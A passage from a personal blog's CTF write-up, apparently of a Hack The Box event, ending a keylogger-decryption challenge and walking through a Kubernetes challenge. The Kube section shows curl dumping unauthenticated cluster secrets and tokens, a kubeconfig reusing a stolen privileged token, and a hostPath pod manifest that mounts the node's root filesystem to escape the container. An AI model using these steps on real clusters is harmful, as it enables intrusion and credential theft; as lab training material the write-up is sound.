+b&#39;7:Key.shiftSinceKey.spaceKey.shiftIKey.spacewontKey.spacecomeKey.spacetoKey.spaceworkKey.spacetodayKey.spaceandKey.spaceKey.shiftIKey.spacereallyKey.spaceneedKey.spacesomeKey.spacefilesKey.spaceleftKey.spaceimKey.spaceKey.backspaceKey.backspacenKey.spacemyKey.spacehardKey.spacedriveKey.spaceatKey.spacemyKey.spaceoffice,Key.spacecanKey.spaceyouKey.spacereachKey.spaceitKey.spaceandKey.spacesendKey.spacemeKey.spacetheKey.spacefileKey.spacenamedKey.spacestaffKey.shift_data.xlsxKey.shift?Key.enter&#39;
+b&#39;8:Key.shiftTheKey.spaceKey.shiftPINKey.spaceforKey.spaceyKey.backspacemyKey.spaceofficeKey.spaceisKey.shift:Key.space50133700013Key.shift}Key.enter&#39;
+b&#39;9:Key.shiftThanksKey.spaceinKey.spaceadvanceKey.shift!Key.enter&#39;
+b&#39;10:Key.shiftCarole.Key.enter&#39;
+b&#39;2:virtKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceboxKey.ctrl_lKey.ctrl_lsysinternalsKey.spacesuideKey.enter&#39;
+b&#39;2:dpiKey.enter&#39;
+</code></pre></div><p>To make the output a little more readable, I replaced strings such as <code>Key.shift</code> and <code>Key.enter</code> with other values so we could see what was written. That meant that the call to <code>print(decrypt(e))</code> was replaced with:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>print(decrypt(e)<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;Key.enter&#39;</span>, <span style=color:#e6db74>&#39;🧵&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;Key.space&#39;</span>, <span style=color:#e6db74>&#39; &#39;</span>)
+    <span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;Key.backspace&#39;</span>, <span style=color:#e6db74>&#39;&lt;&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;Key.shift&#39;</span>, <span style=color:#e6db74>&#39;^&#39;</span>))
+</code></pre></div><p>The output was therefore:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>❯ python3 decryptor.py
+2:google.com🧵
+3:gmail🧵
+4:aedwards^@icorp.com🧵
+5:^^^^^^FORGOTTEN ^HARD ^DRIVE🧵
+6:^Hello eddie,🧵
+7:^Since ^I wont come to work today and ^I really need some files left im &lt;&lt;n my hard drive at my office, can you reach it and send me the file named staff^_data.xlsx^?🧵
+8:^The ^PIN for y&lt;my office is^: 50133700013^}🧵
+9:^Thanks in advance^!🧵
+10:^Carole.🧵
+2:virt&lt;&lt;&lt;&lt;&lt;boxKey.ctrl_lKey.ctrl_lsysinternals suide🧵
+</code></pre></div><p>Much more readable, and we can see the PIN is <code>50133700013^}</code>, which is the second part of the flag!</p>
+<p>Flag: <code>HTB{1_c4n_S33_3v3ryTh1ng_3v3n_y0uR_P1N_50133700013}</code></p>
+<p>Crazy cool :D</p>
+<h2 id=cloudkube>cloud/Kube</h2>
+<ul>
+<li>Name: Kube</li>
+<li>Category: cloud</li>
+<li>Solves: 23</li>
+<li>Rating 1/4</li>
+<li>Type: Hosted</li>
+<li>Description: Due to increase in our web application traffic, we are switcing to kubernetes. We would like you to test our security.</li>
+</ul>
+<hr>
+<p>Fun challenge, although maybe a little easy ;) After enumerating the IP address you get for the challenge, a Kubernetes API server is found on port 8443. Further exploration would have revealed that you were allowed to access secrets without authentication.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>❯ curl -s -k https://10.129.173.212:8443/api/v1/namespaces/kube-system/secrets
+<span style=color:#f92672>{</span>
+  <span style=color:#e6db74>&#34;kind&#34;</span>: <span style=color:#e6db74>&#34;SecretList&#34;</span>,
+  <span style=color:#e6db74>&#34;apiVersion&#34;</span>: <span style=color:#e6db74>&#34;v1&#34;</span>,
+  <span style=color:#e6db74>&#34;metadata&#34;</span>: <span style=color:#f92672>{</span>
+    <span style=color:#e6db74>&#34;resourceVersion&#34;</span>: <span style=color:#e6db74>&#34;94924&#34;</span>
+  <span style=color:#f92672>}</span>,
+  <span style=color:#e6db74>&#34;items&#34;</span>: <span style=color:#f92672>[</span>
+    <span style=color:#f92672>{</span>
+      <span style=color:#e6db74>&#34;metadata&#34;</span>: <span style=color:#f92672>{</span>
+        <span style=color:#e6db74>&#34;name&#34;</span>: <span style=color:#e6db74>&#34;attachdetach-controller-token-5ts7m&#34;</span>,
+        <span style=color:#e6db74>&#34;namespace&#34;</span>: <span style=color:#e6db74>&#34;kube-system&#34;</span>,
+        <span style=color:#e6db74>&#34;uid&#34;</span>: <span style=color:#e6db74>&#34;ff42960f-f063-4df3-b330-e4cbc26f56d4&#34;</span>,
+        <span style=color:#e6db74>&#34;resourceVersion&#34;</span>: <span style=color:#e6db74>&#34;356&#34;</span>,
+        <span style=color:#e6db74>&#34;creationTimestamp&#34;</span>: <span style=color:#e6db74>&#34;2021-07-19T19:06:55Z&#34;</span>,
+        <span style=color:#e6db74>&#34;annotations&#34;</span>: <span style=color:#f92672>{</span>
+          <span style=color:#e6db74>&#34;kubernetes.io/service-account.name&#34;</span>: <span style=color:#e6db74>&#34;attachdetach-controller&#34;</span>,
+          <span style=color:#e6db74>&#34;kubernetes.io/service-account.uid&#34;</span>: <span style=color:#e6db74>&#34;b780d31d-3e92-40af-8a12-dbec2d4e5675&#34;</span>
+        <span style=color:#f92672>}</span>,
+        <span style=color:#e6db74>&#34;managedFields&#34;</span>: <span style=color:#f92672>[</span>
+          <span style=color:#f92672>{</span>
+            <span style=color:#e6db74>&#34;manager&#34;</span>: <span style=color:#e6db74>&#34;kube-controller-manager&#34;</span>,
+            <span style=color:#e6db74>&#34;operation&#34;</span>: <span style=color:#e6db74>&#34;Update&#34;</span>,
+            <span style=color:#e6db74>&#34;apiVersion&#34;</span>: <span style=color:#e6db74>&#34;v1&#34;</span>,
+            <span style=color:#e6db74>&#34;time&#34;</span>: <span style=color:#e6db74>&#34;2021-07-19T19:06:55Z&#34;</span>,
+            <span style=color:#e6db74>&#34;fieldsType&#34;</span>: <span style=color:#e6db74>&#34;FieldsV1&#34;</span>,
+            <span style=color:#e6db74>&#34;fieldsV1&#34;</span>: <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;f:data&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;.&#34;</span>:<span style=color:#f92672>{}</span>,<span style=color:#e6db74>&#34;f:ca.crt&#34;</span>:<span style=color:#f92672>{}</span>,<span style=color:#e6db74>&#34;f:namespace&#34;</span>:<span style=color:#f92672>{}</span>,<span style=color:#e6db74>&#34;f:token&#34;</span>:<span style=color:#f92672>{}}</span>,<span style=color:#e6db74>&#34;f:metadata&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;f:annotations&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;.&#34;</span>:<span style=color:#f92672>{}</span>,<span style=color:#e6db74>&#34;f:kubernetes.io/service-account.name&#34;</span>:<span style=color:#f92672>{}</span>,<span style=color:#e6db74>&#34;f:kubernetes.io/service-account.uid&#34;</span>:<span style=color:#f92672>{}}}</span>,<span style=color:#e6db74>&#34;f:type&#34;</span>:<span style=color:#f92672>{}}</span>
+          <span style=color:#f92672>}</span>
+        <span style=color:#f92672>]</span>
+      <span style=color:#f92672>}</span>,
+      <span style=color:#e6db74>&#34;data&#34;</span>: <span style=color:#f92672>{</span>
+        <span style=color:#e6db74>&#34;ca.crt&#34;</span>: <span style=color:#e6db74>&#34;LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCakNDQWU2Z0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwdGFXNXAKYTNWaVpVTkJNQjRYRFRJeE1EY3hPREU1TURVME1Wb1hEVE14TURjeE56RTVNRFUwTVZvd0ZURVRNQkVHQTFVRQpBeE1LYldsdWFXdDFZbVZEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTWJRCmM1YmlkbEl0ekdDemNDRUltaHRJTVBucVdiZkRUbGgxdHFFVUozakM5RHJJNE5WRWt0cnB0MnFsbEFCNlJLQlMKNTNUTDFMcHVtMEl3ZTdzZkdJTCtZaG1Zb2ZUZ2VWSHJVMWJzaHBESXlkU3kwTTBKMFhvMG5zQ2lrajgvWHBjbApjbVNzSUhQMjUwNFRXekRaYXF1dU96cUxJWklkNzQrY3FQQ0VXMnlhazFUVWdmVXoyTVdTbVM4eDJMSG05SkJVCmVEcnFkTUx2K2NhVTRET2FLUFVtaVhYNUFSOUp1UGUvTGRYcno5RUw0Sm1mZUFBakhZSVBTcXRIbXpQMmxxdVYKbjk3M254RkpxZEtlWWovNGpvQldNd2t4MXpCZkpZUG5uWkRoUk94NFhOMUxrdFVDeDBoWmlhNEs4OHRCeS9CYQp6eml3NFloRmtycWo0dnNlSDdzQ0F3RUFBYU5oTUY4d0RnWURWUjBQQVFIL0JBUURBZ0trTUIwR0ExVWRKUVFXCk1CUUdDQ3NHQVFVRkJ3TUNCZ2dyQmdFRkJRY0RBVEFQQmdOVkhSTUJBZjhFQlRBREFRSC9NQjBHQTFVZERnUVcKQkJRTXlHNGVkOC93WWdjRFBGeW5HdVE1SVNzL3pqQU5CZ2txaGtpRzl3MEJBUXNGQUFPQ0FRRUFZY2dvbjUrNAp3cklTN0hlVm1pSWQvamRCOU1zdXNsTVl5dU11R2hWVXBIc1QvWEg0aUxTVjhiQWNSNDd2bjFmcjZqVFN3UGJYCnd5c1AzSTRwcHNZWkNWdDEzRWJSNlBsZktIUzlONlJYLzI4eXFVcmJwTUM2Z3NqVVNOd1FEdTQralVvb3BicGcKZW55eTZIZkRlTnZyTDMxOGoyOFZBT2syREw4NzFwNTV3SnhGUlhzeTZFeVFLczR0eXovSVVGTlVVZktTWVhmMgpZQmFaTHY4TzFaWGdBVEpqSFJRMEZySEhxcHZHdEcxdGRqVXhSSmQzSlFxMHlHd1AyYVZiMGhMNkQ0eUdCUzhMCk83MWdDRWlxcjY4OEZOSFhObGdyekwxc0JqNVlKcGNzLzV4NkdjYmp1WXVUMFcwZ0pIbHIwZGR1aUpDTmZVamsKWm9RRXU3OTFPK3RBOWc9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==&#34;</span>,
+        <span style=color:#e6db74>&#34;namespace&#34;</span>: <span style=color:#e6db74>&#34;a3ViZS1zeXN0ZW0=&#34;</span>,
+        <span style=color:#e6db74>&#34;token&#34;</span>: <span style=color:#e6db74>&#34;ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklrMVlTbFZxVDBwM2QyTnRNVzk1V2xCM09Ua3hRMEpmYW1oTmVHMHhUMlZTZUVOSVRITmZZV3gwYldzaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKaGRIUmhZMmhrWlhSaFkyZ3RZMjl1ZEhKdmJHeGxjaTEwYjJ0bGJpMDFkSE0zYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZ5ZG1salpTMWhZMk52ZFc1MExtNWhiV1VpT2lKaGRIUmhZMmhrWlhSaFkyZ3RZMjl1ZEhKdmJHeGxjaUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJbUkzT0RCa016RmtMVE5sT1RJdE5EQmhaaTA0WVRFeUxXUmlaV015WkRSbE5UWTNOU0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwcmRXSmxMWE41YzNSbGJUcGhkSFJoWTJoa1pYUmhZMmd0WTI5dWRISnZiR3hsY2lKOS5ZR0VyLWtWQmZweUJ1UWVnUFdYU2hMUnFQOHA0WUxkSnFKdXVKYVU4V01BalVDQnhjNnRqMVNKdmlpM09jOXd1SjlzZ04wVUQ4c2phS0dqSkVGUF9zRDdRcV8wSXEtM0pxcG1vTkNpNW1qcGdEeGlNTVBKWHJUbzBqV0oyVl9WSmt0V18za29YLXh0bmZ3WS1ONVQtalpJTENqR1JYMF90V1pnS09IYmxBclppT1FfVjN0TnJwU0pFQmxvZmlVNzhHQWZtMDlETmExX1pkUHhKVFdBSjNoaElETzFUVmJTZG9WcGRZSXVlWFBEb0FXZXlrMEVHcnpsNVJyT0FzLU9Fd05tMU5yU1dhaFpNdnFsUmVQbmswdmxHc01LZTM5amZ5Q0dGVmd0ZkI1ZG1mYTh6bXRqcDYyOGNwaHZXOXFOSmhEeGZ0bFhJVFFiQmtfMlVydGxQZXc=&#34;</span>
+      <span style=color:#f92672>}</span>,
+      <span style=color:#e6db74>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;kubernetes.io/service-account-token&#34;</span>
+    <span style=color:#f92672>}</span>,
+
+...
+</code></pre></div><p>It is possible to configure the <code>kubectl</code> Kubernetes client to use a token (I grabbed one for the default service account), with the following <code>~/.kube/config</code> file format:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>v1</span>
+<span style=color:#f92672>clusters</span>:
+- <span style=color:#f92672>cluster</span>:
+    <span style=color:#f92672>insecure-skip-tls-verify</span>: <span style=color:#66d9ef>true</span>
+    <span style=color:#f92672>server</span>: <span style=color:#ae81ff>https://10.129.173.212:8443</span>
+  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>scratch</span>
+<span style=color:#f92672>contexts</span>:
+- <span style=color:#f92672>context</span>:
+    <span style=color:#f92672>cluster</span>: <span style=color:#ae81ff>scratch</span>
+    <span style=color:#f92672>user</span>: <span style=color:#ae81ff>userino</span>
+  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>contexterino</span>
+<span style=color:#f92672>current-context</span>: <span style=color:#e6db74>&#34;&#34;</span>
+<span style=color:#f92672>kind</span>: <span style=color:#ae81ff>Config</span>
+<span style=color:#f92672>preferences</span>: {}
+<span style=color:#f92672>users</span>:
+- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>userino</span>
+  <span style=color:#f92672>user</span>:
+    <span style=color:#f92672>token</span>: <span style=color:#ae81ff>eyJhbGciOiJSUzI1NiIsImtpZCI6Ik1YSlVqT0p3d2NtMW95WlB3OTkxQ0JfamhNeG0xT2VSeENITHNfYWx0bWsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkZWZhdWx0LXRva2VuLTdmaDg5Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImRlZmF1bHQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJjNzM4YjRjMy1lNjE1LTRhYTktODZmYS1mOWYyZWU0M2ZmMzgiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06ZGVmYXVsdCJ9.gJFAXzNWCh7e4cgKgaYHf96zH33Q06XnigyB5zZiYsjlKQBBebB4mykMhLB-_UbB7YRnMqOFVPd0pj82q72E3LvizUxVNK90vtZGqLVS4oeCKjWOj30FpwGHR0aDW8id55U3yCv0x1gTJVK25dUQkqqelaG6qGtV35NCAz5oXNfQLWXbhCih0zYHHoM6vvHzK8PpR_YEMXoJV81uKfYBHioRZXDpYHe_3783A202PVCElIwWlT2YzSCTdj9zvx14Xm-sJJyLB8jMkZx19TM_cFRGZ4ig6Pso585Xjf3zmtGI2kz8jSLHKz8qXfZQixXdbzWnJPsz2EdC7XhMIfcfNQ</span>
+</code></pre></div><p>That means that we could now interact with the remote Kubernetes cluster using the <code>kubectl</code> command to do things. Because this was highly privileged token, we could also launch pods and make changes as necessary.</p>
+<p>Enumerating the cluster you&rsquo;d find default Kubernetes namespaces and an <code>alpine</code> pod that cant start up.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>❯ kubectl --context=contexterino --namespace=kube-system get pods
+NAME                           READY   STATUS             RESTARTS   AGE
+alpine                         0/1     ImagePullBackOff   0          5d1h
+coredns-558bd4d5db-qrg6l       1/1     Running            5          7d2h
+etcd-kube                      1/1     Running            0          10m
+kube-apiserver-kube            1/1     Running            0          10m
+kube-controller-manager-kube   1/1     Running            5          7d2h
+kube-proxy-ndk7j               1/1     Running            5          7d2h
+kube-scheduler-kube            1/1     Running            5          7d2h
+storage-provisioner            1/1     Running            11         7d2h
+</code></pre></div><p>Running <code>describe pod alpine</code> we&rsquo;d see that the pod can&rsquo;t pull the image needed for it.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>Warning  Failed          8m15s (x4 over 10m)  kubelet            Failed to pull image &#34;alpine&#34;: rpc error: code = Unknown desc = Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)
+Warning  Failed          8m15s (x4 over 10m)  kubelet            Error: ErrImagePull
+Warning  Failed          7m49s (x6 over 10m)  kubelet            Error: ImagePullBackOff
+Normal   BackOff         23s (x35 over 10m)   kubelet            Back-off pulling image &#34;alpine&#34;
+</code></pre></div><p>I spent some time investigating pods by trying to get shells inside of them. The general workflow was to list the pods in each namespace, and then <code>exec</code> inside of each. However, I couldn&rsquo;t run <code>sh</code> or <code>bash</code> in many of them as they were simply not installed. A good hardening tip! Ofc, I could have run other commands, but meh.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>❯ kubectl --context=contexterino --namespace=kube-system exec -it kube-apiserver-kube -- sh
+OCI runtime exec failed: exec failed: container_linux.go:344: starting container process caused &#34;exec: \&#34;sh\&#34;: executable file not found in $PATH&#34;: unknown
+command terminated with exit code 126
+</code></pre></div><p>The pods that <em>did</em> give me a shell were:</p>
+<ul>
+<li>kube-system/etcd-kube</li>
+<li>kube-system/kube-proxy-ndk7j</li>
+</ul>
+<p>Neither had anything interesting in them though. Time for a new strategy!</p>
+<p>One attack plan we could exercise was to escape to the Kubernetes node a pod is running on by mounting the nodes&rsquo; file system into a container. This can be done with a <code>hostPath</code> mount option for a deployment. I did not want to fiddle with pods running in the <code>kube-system</code> namespace in fear of breaking them, so I opted to create a new deployment with the <code>hostPath</code> configuration. Because we can&rsquo;t pull the alpine image, I chose to re-use one of the already running pods images.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>❯ kubectl --context=contexterino --namespace=kube-system describe pod kube-proxy-ndk7j | grep Image
+    Image:         k8s.gcr.io/kube-proxy:v1.21.2
+    Image ID:      docker-pullable://k8s.gcr.io/kube-proxy@sha256:3ee783402715225d6bc483b3a2f8ea11adcb997d00fb5ca2f74734023ade0561
+</code></pre></div><p>Great. The last step was to create a new deployment and apply it.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml>
+<span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>v1</span>
+<span style=color:#f92672>kind</span>: <span style=color:#ae81ff>Pod</span>
+<span style=color:#f92672>metadata</span>:
+  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>alpine-pew</span>
+  <span style=color:#f92672>namespace</span>: <span style=color:#ae81ff>default</span>
+<span style=color:#f92672>spec</span>:
+  <span style=color:#f92672>volumes</span>:
+  - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>host-fs</span>
+    <span style=color:#f92672>hostPath</span>:
+      <span style=color:#f92672>path</span>: <span style=color:#ae81ff>/</span>
+  <span style=color:#f92672>containers</span>:
+  - <span style=color:#f92672>image</span>: <span style=color:#ae81ff>k8s.gcr.io/kube-proxy:v1.21.2</span>
+    <span style=color:#f92672>command</span>:
+      - <span style=color:#ae81ff>/bin/sh</span>
+      - <span style=color:#e6db74>&#34;-c&#34;</span>
+      - <span style=color:#e6db74>&#34;sleep 60m&#34;</span>
+    <span style=color:#f92672>volumeMounts</span>:
+    - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>host-fs</span>
+      <span style=color:#f92672>mountPath</span>: <span style=color:#ae81ff>/mnt</span>
+    <span style=color:#f92672>imagePullPolicy</span>: <span style=color:#ae81ff>IfNotPresent</span>
+    <span style=color:#f92672>name</span>: <span style=color:#ae81ff>alpine</span>
+  <span style=color:#f92672>restartPolicy</span>: <span style=color:#ae81ff>Always</span>
+</code></pre></div><p>Applying the deployment was as simple as:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>❯ kubectl --context<span style=color:#f92672>=</span>contexterino apply -f pew.yml
+pod/alpine-pew created
+</code></pre></div><p>Finally, get a shell and browse the nodes filesystem!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>❯ kubectl --context=contexterino --namespace=default exec -it alpine-pew -- sh
+# cd /mnt
+# ls
+bin   dev  home        initrd.img.old  lib32  libx32 media  opt   root  sbin  sys usr  vmlinuz
+boot  etc  initrd.img  lib       lib64  lost+found  mnt proc  run   srv   tmp var  vmlinuz.old
+# cd root
+# ls
+flag.txt
+# cat flag.txt
+HTB{5y573m:4N0nYM0u5}
+</code></pre></div><p>Flag: <code>HTB{5y573m:4N0nYM0u5}</code></p>
+<h1 id=conclusion>conclusion</h1>
+<p>We solved a lot, and this is by no means all of them, but, it&rsquo;s the ones I enjoyed!</p>
+</div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button next">
+<a href=https://leonjza.github.io/blog/2021/05/09/dawgctf-2021/>
+<span class=button__text>DawgCTF 2021</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
+</div>
+</footer>
+<script src=https://leonjza.github.io/assets/main.js></script>
+<script src=https://leonjza.github.io/assets/prism.js></script>
+</div>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
+</body>
+</html>
